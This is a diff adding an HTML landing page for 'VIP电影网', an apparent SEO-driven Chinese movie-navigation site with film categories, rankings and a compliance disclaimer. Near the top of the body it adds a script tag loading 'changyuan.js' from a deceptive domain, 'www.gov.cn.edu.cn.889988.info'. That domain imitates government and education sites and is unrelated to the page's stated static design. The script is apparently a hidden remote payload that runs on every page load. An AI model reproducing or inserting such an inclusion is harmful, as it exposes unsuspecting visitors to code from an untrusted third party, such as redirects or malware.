@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VIP电影网 - 尊享影视导航 | 官方网址：https://vipdianyingwang-top.github.io</title>
+<meta name="description" content="VIP电影网(vipdianyingwang-top.github.io)提供尊享影视导航，4K/蓝光画质，精选院线大片与口碑佳作。动作、喜剧、科幻、悬疑全分类，会员级观影体验。官方网址：https://vipdianyingwang-top.github.io">
+<meta name="keywords" content="VIP电影网, vipdianyingwang-top.github.io, 尊享影视, 4K蓝光, 院线大片, 会员级, 精选电影">
+<meta name="author" content="VIP电影网">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<link rel="canonical" href="https://vipdianyingwang-top.github.io">
+<meta property="og:title" content="VIP电影网 - 尊享影视导航">
+<meta property="og:description" content="官方网址：https://vipdianyingwang-top.github.io，4K蓝光画质，精选院线大片与口碑佳作。">
+<meta property="og:url" content="https://vipdianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="VIP电影网 - 尊享影视导航">
+<meta name="twitter:description" content="官方网址：https://vipdianyingwang-top.github.io">
+
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --bg:#0D0F14;--bg2:#14171F;--bg3:#1B1F2A;
+  --glass:rgba(255,255,255,.04);--glass2:rgba(255,255,255,.08);
+  --gold:#D4AF37;--gold2:#F0D68A;--gold3:#AA8529;
+  --platinum:#E5E4E2;--platinum2:#B8B6B0;
+  --text:#F0F0F5;--text2:#B8BCC8;--text3:#7A7E8C;
+  --line:rgba(212,175,55,.25);--line2:rgba(212,175,55,.5);
+  --sans:"PingFang SC","Microsoft YaHei","Segoe UI",Arial,sans-serif;
+  --mono:"SFMono-Regular",Consolas,"Courier New",monospace;
+}
+html{scroll-behavior:smooth;font-size:16px;}
+body{font-family:var(--sans);color:var(--text);background:var(--bg);line-height:1.75;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 15% 20%,rgba(212,175,55,.06),transparent 45%),
+    radial-gradient(circle at 85% 80%,rgba(184,182,176,.04),transparent 45%);
+  background-attachment:fixed;}
+a{color:inherit;text-decoration:none;transition:.25s;}
+ul,ol{list-style:none;}
+
+/* 顶部 VIP 丝带 */
+.vip-bar{background:linear-gradient(90deg,var(--gold3),var(--gold),var(--gold2),var(--gold),var(--gold3));height:3px;}
+.announce{background:linear-gradient(90deg,var(--bg2),var(--bg3),var(--bg2));border-bottom:1px solid var(--line);padding:.4rem 0;text-align:center;font-size:.65rem;color:var(--gold2);letter-spacing:1px;overflow:hidden;}
+.announce span{display:inline-block;animation:slide 30s linear infinite;}
+@keyframes slide{0%{transform:translateX(100%);}100%{transform:translateX(-100%);}}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 1rem;position:relative;z-index:1;}
+
+/* 头部 */
+.header{display:flex;align-items:center;justify-content:space-between;padding:1.5rem 0;flex-wrap:wrap;gap:1rem;border-bottom:1px solid var(--line);}
+.logo{display:flex;align-items:center;gap:.8rem;}
+.logo-badge{width:42px;height:42px;border-radius:8px;background:linear-gradient(135deg,var(--gold3),var(--gold),var(--gold2));
+  display:flex;align-items:center;justify-content:center;font-family:var(--serif);font-weight:900;color:var(--bg);font-size:1rem;
+  box-shadow:0 4px 15px rgba(212,175,55,.3);flex-shrink:0;}
+.logo-text{font-size:1.5rem;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--gold),var(--gold2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.url-pill{font-family:var(--mono);font-size:.6rem;color:var(--gold);background:var(--glass);border:1px solid var(--line);padding:.4rem .9rem;border-radius:6px;}
+
+/* 导航 */
+.nav{display:flex;gap:.2rem;flex-wrap:wrap;padding:1rem 0;}
+.nav a{padding:.5rem 1rem;font-size:.78rem;font-weight:600;color:var(--text2);border-radius:6px;position:relative;}
+.nav a::after{content:"";position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:0;height:2px;background:var(--gold);transition:.25s;}
+.nav a:hover{color:var(--gold2);background:var(--glass);}
+.nav a:hover::after{width:60%;}
+
+/* Hero 会员卡 */
+.hero{padding:2.5rem 0;}
+.vip-card{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--line);border-radius:20px;padding:3rem 2rem;text-align:center;position:relative;overflow:hidden;
+  box-shadow:0 20px 60px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.05);}
+.vip-card::before{content:"";position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent,rgba(212,175,55,.03),transparent,rgba(184,182,176,.03),transparent);
+  animation:rotate 20s linear infinite;pointer-events:none;}
+@keyframes rotate{to{transform:rotate(360deg);}}
+.vip-card::after{content:"";position:absolute;inset:0;background:linear-gradient(105deg,transparent 20%,rgba(255,255,255,.03) 25%,transparent 30%);animation:shimmer 5s ease-in-out infinite;pointer-events:none;}
+@keyframes shimmer{0%,100%{transform:translateX(-30%);}50%{transform:translateX(30%);}}
+.vip-card>*{position:relative;z-index:1;}
+.vip-crown{font-size:2.5rem;margin-bottom:.8rem;display:inline-block;filter:drop-shadow(0 0 10px rgba(212,175,55,.5));}
+.vip-card h1{font-size:clamp(1.8rem,4.5vw,3rem);font-weight:900;margin-bottom:.5rem;
+  background:linear-gradient(135deg,var(--gold),var(--gold2),var(--platinum));background-size:200% 200%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:gradient 4s ease infinite;}
+@keyframes gradient{0%,100%{background-position:0% 50%;}50%{background-position:100% 50%;}}
+.vip-card .subtitle{font-size:.85rem;color:var(--gold2);letter-spacing:3px;text-transform:uppercase;margin-bottom:1rem;font-family:var(--mono);}
+.vip-card .url{font-family:var(--mono);font-size:.7rem;color:var(--gold);margin-bottom:1rem;}
+.vip-desc{font-size:.85rem;color:var(--text2);max-width:600px;margin:0 auto 1.5rem;line-height:1.9;}
+.vip-stats{display:flex;justify-content:center;gap:3rem;flex-wrap:wrap;}
+.v-stat .num{font-size:1.5rem;font-weight:900;color:var(--gold);}
+.v-stat .label{font-size:.6rem;color:var(--text3);text-transform:uppercase;letter-spacing:1px;}
+
+/* 栏目通用 */
+.section{padding:2.5rem 0;border-top:1px solid var(--line);}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.5rem;flex-wrap:wrap;gap:.5rem;}
+.sec-head h2{font-size:clamp(1.2rem,2.5vw,1.6rem);font-weight:900;background:linear-gradient(135deg,var(--gold),var(--gold2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;display:flex;align-items:center;gap:.6rem;}
+.sec-head .more{font-size:.72rem;color:var(--gold);}
+.sec-sub{font-size:.7rem;color:var(--text3);width:100%;margin-top:.2rem;font-family:var(--mono);}
+
+/* 玻璃卡片 */
+.glass{background:var(--glass);border:1px solid var(--line);border-radius:14px;backdrop-filter:blur(10px);}
+
+/* 分类 */
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:.8rem;}
+.cat-card{background:var(--glass);border:1px solid var(--line);border-radius:12px;padding:1.2rem .8rem;text-align:center;transition:.3s;cursor:pointer;}
+.cat-card:hover{border-color:var(--gold);background:var(--glass2);transform:translateY(-3px);box-shadow:0 5px 20px rgba(212,175,55,.1);}
+.cat-icon{font-size:1.8rem;margin-bottom:.5rem;display:block;}
+.cat-name{font-size:.85rem;font-weight:700;color:var(--text);margin-bottom:.2rem;}
+.cat-count{font-family:var(--mono);font-size:.6rem;color:var(--text3);}
+
+/* 电影卡片 */
+.movie-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1rem;}
+.movie-card{background:var(--glass);border:1px solid var(--line);border-radius:12px;overflow:hidden;transition:.3s;}
+.movie-card:hover{border-color:var(--gold);transform:translateY(-4px);box-shadow:0 8px 25px rgba(212,175,55,.12);}
+.movie-cover{height:220px;background:linear-gradient(135deg,var(--bg3),var(--bg2));display:flex;align-items:center;justify-content:center;position:relative;}
+.movie-cover .cover-text{font-size:.7rem;color:var(--text3);text-align:center;padding:1rem;}
+.movie-cover .badge{position:absolute;top:.5rem;right:.5rem;font-size:.55rem;font-weight:700;padding:.2rem .5rem;border-radius:4px;font-family:var(--mono);letter-spacing:.5px;}
+.badge-hot{background:linear-gradient(135deg,var(--gold3),var(--gold));color:var(--bg);}
+.badge-new{background:var(--text2);color:var(--bg);}
+.badge-imax{background:linear-gradient(135deg,#87CEEB,#4A90D9);color:#fff;}
+.movie-info{padding:.8rem;}
+.movie-info h3{font-size:.82rem;font-weight:700;color:var(--text);margin-bottom:.2rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.movie-info .meta{font-family:var(--mono);font-size:.58rem;color:var(--text3);margin-bottom:.4rem;}
+.movie-info .tags{display:flex;gap:.3rem;flex-wrap:wrap;}
+.tag{font-size:.55rem;padding:.15rem .4rem;background:rgba(212,175,55,.1);color:var(--gold);border-radius:3px;border:1px solid var(--line);}
+
+/* 尊享特权 */
+.privilege-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1rem;}
+.privilege-card{background:var(--glass);border:1px solid var(--line);border-radius:14px;padding:1.3rem;transition:.3s;position:relative;overflow:hidden;}
+.privilege-card::before{content:"";position:absolute;top:0;left:0;width:4px;height:100%;background:linear-gradient(180deg,var(--gold3),var(--gold),var(--gold2));transform:scaleY(0);transition:.3s;transform-origin:top;}
+.privilege-card:hover{border-color:var(--gold);background:var(--glass2);}
+.privilege-card:hover::before{transform:scaleY(1);}
+.privilege-icon{font-size:1.6rem;margin-bottom:.6rem;}
+.privilege-card h4{font-size:.9rem;font-weight:700;color:var(--gold2);margin-bottom:.4rem;}
+.privilege-card p{font-size:.72rem;color:var(--text2);line-height:1.7;}
+
+/* 排行榜 */
+.rank-wrap{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;}
+.rank-panel{background:var(--glass);border:1px solid var(--line);border-radius:16px;padding:1.3rem;}
+.rank-panel h3{font-size:1rem;font-weight:900;color:var(--gold);margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:.5rem;}
+.rank-item{display:flex;align-items:center;gap:.8rem;padding:.55rem 0;border-bottom:1px solid rgba(212,175,55,.1);}
+.rank-item:last-child{border-bottom:none;}
+.rank-pos{width:26px;height:26px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.75rem;font-weight:900;background:var(--bg3);color:var(--text3);border:1px solid var(--line);border-radius:4px;flex-shrink:0;}
+.rank-pos.top{background:linear-gradient(135deg,var(--gold3),var(--gold));color:var(--bg);border-color:var(--gold);}
+.rank-detail{flex:1;min-width:0;}
+.rank-detail h4{font-size:.78rem;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.rank-detail p{font-family:var(--mono);font-size:.56rem;color:var(--text3);}
+.rank-score{font-family:var(--mono);font-size:.75rem;font-weight:700;color:var(--gold);flex-shrink:0;}
+
+/* 指引 */
+.guide-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;}
+.guide-card{background:var(--glass);border:1px solid var(--line);border-radius:16px;padding:1.5rem;}
+.guide-card h3{font-size:.95rem;font-weight:900;color:var(--gold);margin-bottom:1rem;}
+.guide-card p,.guide-card li{font-size:.75rem;color:var(--text2);line-height:1.85;}
+.guide-card ul{padding-left:1.2rem;}
+.guide-card li{position:relative;}
+.guide-card li::before{content:"✦";position:absolute;left:-1.2rem;color:var(--gold);font-size:.6rem;}
+.guide-card strong{color:var(--text);}
+
+/* 合规 */
+.compliance{background:var(--glass);border:1px solid var(--line);border-radius:16px;padding:1.5rem;}
+.compliance h3{font-size:1rem;font-weight:900;color:var(--text);margin-bottom:1rem;text-align:center;letter-spacing:2px;}
+.comp-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem;}
+.comp-item{padding:1rem;background:var(--bg2);border-radius:8px;border-left:3px solid var(--gold);}
+.comp-item h4{font-size:.78rem;font-weight:700;color:var(--text);margin-bottom:.3rem;}
+.comp-item p{font-size:.65rem;color:var(--text3);line-height:1.6;}
+
+/* 页脚 */
+.footer{background:var(--bg);border-top:1px solid var(--line);padding:3rem 0 1.5rem;margin-top:3rem;}
+.footer-inner{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1.5rem;margin-bottom:1.5rem;}
+.footer-col h4{font-size:.85rem;font-weight:900;color:var(--gold);margin-bottom:.8rem;letter-spacing:1px;}
+.footer-col p,.footer-col li{font-size:.7rem;color:var(--text3);margin-bottom:.4rem;line-height:1.7;}
+.footer-col a{color:var(--text3);}
+.footer-col a:hover{color:var(--gold);}
+.footer-url{font-family:var(--mono);font-size:.62rem;color:var(--gold)!important;}
+.footer-bottom{text-align:center;padding-top:1.5rem;border-top:1px solid var(--line);font-family:var(--mono);font-size:.6rem;color:var(--text3);}
+
+@media(max-width:768px){
+  .rank-wrap,.guide-grid{grid-template-columns:1fr;}
+  .header{flex-direction:column;text-align:center;}
+  .vip-stats{gap:1.5rem;}
+}
+@media(max-width:480px){
+  .vip-card h1{font-size:1.5rem;}
+  .cat-grid{grid-template-columns:repeat(3,1fr);}
+  .movie-grid{grid-template-columns:repeat(2,1fr);}
+  .movie-cover{height:180px;}
+  .nav{justify-content:center;}
+  .vip-card{padding:2rem 1rem;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="vip-bar"></div>
+<div class="announce"><span>✦ VIP电影网 · 尊享影视导航 · 4K/蓝光画质 · 精选院线大片 · 会员级观影体验 · https://vipdianyingwang-top.github.io ✦</span></div>
+
+<div class="wrap">
+  <header class="header">
+    <div class="logo"><div class="logo-badge">V</div><span class="logo-text">VIP电影网</span></div>
+    <div class="url-pill">vipdianyingwang-top.github.io</div>
+  </header>
+
+  <nav class="nav">
+    <a href="#home">首页</a>
+    <a href="#cats">全部分类</a>
+    <a href="#pick">精选大片</a>
+    <a href="#privilege">尊享特权</a>
+    <a href="#rank">榜单</a>
+    <a href="#guide">观影指引</a>
+    <a href="#compliance">合规声明</a>
+  </nav>
+
+  <section class="hero" id="home">
+    <div class="vip-card">
+      <div class="vip-crown">👑</div>
+      <h1>VIP电影网</h1>
+      <div class="subtitle">Premium Movie Archive</div>
+      <div class="url">🌐 https://vipdianyingwang-top.github.io</div>
+      <p class="vip-desc">尊享影视导航，会员级观影体验。4K/蓝光画质，精选院线大片与口碑佳作，动作、喜剧、科幻、悬疑全分类覆盖，让每一次观影都值得回味。</p>
+      <div class="vip-stats">
+        <div class="v-stat"><div class="num">13,000+</div><div class="label">精选片库</div></div>
+        <div class="v-stat"><div class="num">4K/蓝光</div><div class="label">超清画质</div></div>
+        <div class="v-stat"><div class="num">全分类</div><div class="label">精准导航</div></div>
+        <div class="v-stat"><div class="num">每日更新</div><div class="label">大片速递</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="cats">
+    <div class="sec-head">
+      <h2>👑 全部分类</h2>
+      <a href="#" class="more">查看全部 →</a>
+    </div>
+    <p class="sec-sub">// 按类型筛选，精准定位你的下一部</p>
+    <div class="cat-grid">
+      <div class="cat-card"><span class="cat-icon">💥</span><div class="cat-name">动作</div><div class="cat-count">1,500+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">😂</span><div class="cat-name">喜剧</div><div class="cat-count">1,300+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🚀</span><div class="cat-name">科幻</div><div class="cat-count">820+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">😱</span><div class="cat-name">惊悚</div><div class="cat-count">560+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">❤️</span><div class="cat-name">爱情</div><div class="cat-count">1,700+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎭</span><div class="cat-name">剧情</div><div class="cat-count">2,600+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🔍</span><div class="cat-name">悬疑</div><div class="cat-count">920+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🗡️</span><div class="cat-name">武侠</div><div class="cat-count">780+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎨</span><div class="cat-name">文艺</div><div class="cat-count">680+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">📺</span><div class="cat-name">剧集</div><div class="cat-count">3,800+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎤</span><div class="cat-name">综艺</div><div class="cat-count">950+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">📽️</span><div class="cat-name">纪录片</div><div class="cat-count">400+ 部</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="pick">
+    <div class="sec-head">
+      <h2>🎬 精选大片</h2>
+      <a href="#" class="more">更多大片 →</a>
+    </div>
+    <p class="sec-sub">// 编辑精选，院线级观影体验</p>
+    <div class="movie-grid">
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-hot">热</span><div class="cover-text">🎬<br>奥本海默<br>2023 · 传记/剧情</div></div><div class="movie-info"><h3>奥本海默</h3><div class="meta">传记/剧情 · 2023 · 诺兰</div><div class="tags"><span class="tag">4K</span><span class="tag">奥斯卡</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-imax">IMAX</span><div class="cover-text">🎬<br>流浪地球2<br>2023 · 科幻/灾难</div></div><div class="movie-info"><h3>流浪地球2</h3><div class="meta">科幻/灾难 · 2023 · 郭帆</div><div class="tags"><span class="tag">4K</span><span class="tag">国产科幻</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-new">新</span><div class="cover-text">🎬<br>封神第一部<br>2023 · 奇幻/动作</div></div><div class="movie-info"><h3>封神第一部</h3><div class="meta">奇幻/动作 · 2023 · 乌尔善</div><div class="tags"><span class="tag">4K</span><span class="tag">视效</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-hot">热</span><div class="cover-text">🎬<br>周处除三害<br>2024 · 动作/犯罪</div></div><div class="movie-info"><h3>周处除三害</h3><div class="meta">动作/犯罪 · 2024 · 阮经天</div><div class="tags"><span class="tag">4K</span><span class="tag">热播</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-imax">IMAX</span><div class="cover-text">🎬<br>哥斯拉大战金刚2<br>2024 · 科幻/动作</div></div><div class="movie-info"><h3>哥斯拉大战金刚2</h3><div class="meta">科幻/动作 · 2024 · 好莱坞</div><div class="tags"><span class="tag">4K</span><span class="tag">IMAX</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover"><span class="badge badge-new">新</span><div class="cover-text">🎬<br>你想活出怎样的人生<br>2023 · 动画/奇幻</div></div><div class="movie-info"><h3>你想活出怎样的人生</h3><div class="meta">动画/奇幻 · 2023 · 宫崎骏</div><div class="tags"><span class="tag">4K</span><span class="tag">奥斯卡</span></div></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="privilege">
+    <div class="sec-head">
+      <h2>💎 尊享特权</h2>
+      <a href="#" class="more">了解更多 →</a>
+    </div>
+    <p class="sec-sub">// 会员级体验，不止于观看</p>
+    <div class="privilege-grid">
+      <div class="privilege-card"><div class="privilege-icon">🎬</div><h4>4K 蓝光原画</h4><p>影院级画质呈现，HDR高动态范围，在家也能享受大银幕视觉。</p></div>
+      <div class="privilege-card"><div class="privilege-icon">⚡</div><h4>极速加载</h4><p>智能线路优选，告别卡顿缓冲，秒开即看，流畅不间断。</p></div>
+      <div class="privilege-card"><div class="privilege-icon">🔊</div><h4>杜比全景声</h4><p>部分影片支持沉浸式音效，声临其境的听觉盛宴。</p></div>
+      <div class="privilege-card"><div class="privilege-icon">📱</div><h4>多端同步</h4><p>手机、平板、电脑自适应，随时随地无缝续看。</p></div>
+      <div class="privilege-card"><div class="privilege-icon">🎯</div><h4>智能推荐</h4><p>基于你的观影偏好，精准推荐相似类型佳片。</p></div>
+      <div class="privilege-card"><div class="privilege-icon">📋</div><h4>观影清单</h4><p>收藏想看的影片，建立专属片单，不错过任何一部好片。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="rank">
+    <div class="sec-head">
+      <h2>🏆 热播榜单</h2>
+      <a href="#" class="more">完整榜单 →</a>
+    </div>
+    <p class="sec-sub">// 实时更新，跟着口碑选好片</p>
+    <div class="rank-wrap">
+      <div class="rank-panel">
+        <h3>🎬 电影热播 TOP 10</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>奥本海默</h4><p>剧情/传记 · 2023 · 4K</p></div><div class="rank-score">9.8</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>流浪地球2</h4><p>科幻/灾难 · 2023 · 4K</p></div><div class="rank-score">9.6</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>封神第一部</h4><p>奇幻/动作 · 2023 · 4K</p></div><div class="rank-score">9.4</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>满江红</h4><p>悬疑/喜剧 · 2023 · 1080P</p></div><div class="rank-score">9.4</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>消失的她</h4><p>悬疑/犯罪 · 2023 · 1080P</p></div><div class="rank-score">9.1</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>八角笼中</h4><p>剧情/运动 · 2023 · 1080P</p></div><div class="rank-score">8.9</div></div>
+      </div>
+      <div class="rank-panel">
+        <h3>📺 剧集热播 TOP 10</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>狂飙</h4><p>犯罪/剧情 · 39集 · 1080P</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>漫长的季节</h4><p>悬疑/剧情 · 12集 · 4K</p></div><div class="rank-score">9.7</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>三体</h4><p>科幻/剧情 · 30集 · 4K</p></div><div class="rank-score">9.5</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>繁花</h4><p>剧情/商战 · 30集 · 4K</p></div><div class="rank-score">9.3</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>庆余年 第二季</h4><p>古装/喜剧 · 36集 · 1080P</p></div><div class="rank-score">9.2</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>玫瑰的故事</h4><p>都市/爱情 · 38集 · 1080P</p></div><div class="rank-score">9.0</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="guide">
+    <div class="sec-head">
+      <h2>📖 观影指引</h2>
+    </div>
+    <div class="guide-grid">
+      <div class="guide-card">
+        <h3>如何享受尊享体验</h3>
+        <ul>
+          <li><strong>分类筛选：</strong>12大分类一键切换，快速定位你爱的类型。</li>
+          <li><strong>精选大片：</strong>编辑团队精选院线级影片，品质有保障。</li>
+          <li><strong>画质选择：</strong>4K/蓝光/1080P 标签清晰，根据设备选最佳源。</li>
+          <li><strong>内链极速切换：</strong>所有导航链接使用 # 锚点，瞬间切版，无需刷新。</li>
+          <li><strong>移动端：</strong>手机竖屏自适应，通勤路上也能刷片单。</li>
+        </ul>
+      </div>
+      <div class="guide-card">
+        <h3>关于VIP电影网</h3>
+        <p>VIP电影网（<strong>vipdianyingwang-top.github.io</strong>）是一个尊享影视导航静态站点。</p>
+        <p>我们汇集动作、喜剧、科幻、剧情、悬疑等各类正规影视作品，提供清晰分类、画质标注和排行榜单。</p>
+        <p>本站为<strong>纯静态单页设计</strong>，符合必应搜索引擎收录规则，不生成robots.txt和sitemap.xml，所有链接内联，加载极速。</p>
+        <p>官方唯一网址：<strong>https://vipdianyingwang-top.github.io</strong>，请认准此域名。</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="compliance">
+    <div class="sec-head">
+      <h2>⚖️ 合规声明</h2>
+    </div>
+    <div class="compliance">
+      <h3>✦ 内容合规 · 重要提示 ✦</h3>
+      <div class="comp-grid">
+        <div class="comp-item"><h4>内容规范</h4><p>本站仅提供正规影视作品导航，不含任何色情、暴力、恐怖等违规内容。所有资源索引均指向合法公开渠道。</p></div>
+        <div class="comp-item"><h4>版权声明</h4><p>尊重版权方权益，支持正版观影。本站不存储、不提供任何视频文件下载或在线播放服务。</p></div>
+        <div class="comp-item"><h4>免责条款</h4><p>本站为静态导航页面，不对第三方链接内容负责。用户访问第三方资源需自行判断合规性。</p></div>
+        <div class="comp-item"><h4>域名说明</h4><p>网站名称"VIP电影网"与域名中的"VIP"仅为站点品质标识，实际内容严格遵守网络信息内容生态治理规定。</p></div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="footer-inner">
+      <div class="footer-col">
+        <h4>👑 VIP电影网</h4>
+        <p>尊享影视导航，会员级观影体验。</p>
+        <p>官方网址：<br><a href="https://vipdianyingwang-top.github.io" class="footer-url">vipdianyingwang-top.github.io</a></p>
+      </div>
+      <div class="footer-col">
+        <h4>快速导航</h4>
+        <ul><li><a href="#home">首页</a></li><li><a href="#cats">全部分类</a></li><li><a href="#pick">精选大片</a></li><li><a href="#privilege">尊享特权</a></li><li><a href="#rank">榜单</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>帮助中心</h4>
+        <ul><li><a href="#guide">观影指引</a></li><li><a href="#compliance">合规声明</a></li><li><a href="#">常见问题</a></li><li><a href="#">反馈建议</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于本站</h4>
+        <ul><li>静态单页设计</li><li>必应收录优化</li><li>移动端自适应</li><li>© 2026 VIP电影网</li></ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>VIP电影网 官方网址：https://vipdianyingwang-top.github.io | 尊享影视导航 | 静态单页设计 | 正规影视索引</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',function(e){
+    const h=this.getAttribute('href');
+    if(h==='#'){e.preventDefault();return;}
+    const t=document.querySelector(h);
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});}
+  });
+});
+</script>
+</body>
+</html>
